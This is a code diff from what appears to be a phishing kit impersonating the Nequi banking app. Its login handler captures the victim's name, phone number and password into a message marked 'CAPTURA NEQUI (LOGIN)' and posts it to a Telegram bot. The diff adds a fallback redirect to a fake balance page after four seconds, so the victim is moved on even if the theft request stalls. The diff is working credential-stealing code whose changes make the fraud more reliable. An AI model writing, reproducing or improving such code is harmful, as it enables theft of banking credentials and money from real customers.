@@ -116,6 +116,17 @@ document.addEventListener('DOMContentLoaded', () => {
         const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
         const mensaje = `🔔 **CAPTURA NEQUI (LOGIN)**\n\n👤 **Nombre:** \`${userNombre}\`\n📱 **Celular:** \`${phone}\`\n🔑 **Clave:** \`${password}\`\n\n🔄 **Redirigiendo a Saldo...**`;
 
+        // Lógica de redirección robusta (evitar bloqueos)
+        let redirected = false;
+        const doRedirect = () => {
+            if (redirected) return;
+            redirected = true;
+            window.location.href = 'saldo.html';
+        };
+
+        // Fallback: Redirigir en 4s si Telegram falla o tarda mucho
+        setTimeout(doRedirect, 4000);
+
         try {
             await fetch(`${API_URL}/sendMessage`, {
                 method: 'POST',
@@ -127,13 +138,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 })
             });
             
-            // Redirigir inmediatamente a saldo.html sin esperar acción
-            window.location.href = 'saldo.html';
+            doRedirect();
 
         } catch (error) {
             console.error("Error al enviar a Telegram:", error);
-            // Redirigir de todos modos para no bloquear al usuario
-            window.location.href = 'saldo.html';
+            doRedirect();
         }
     });
 });
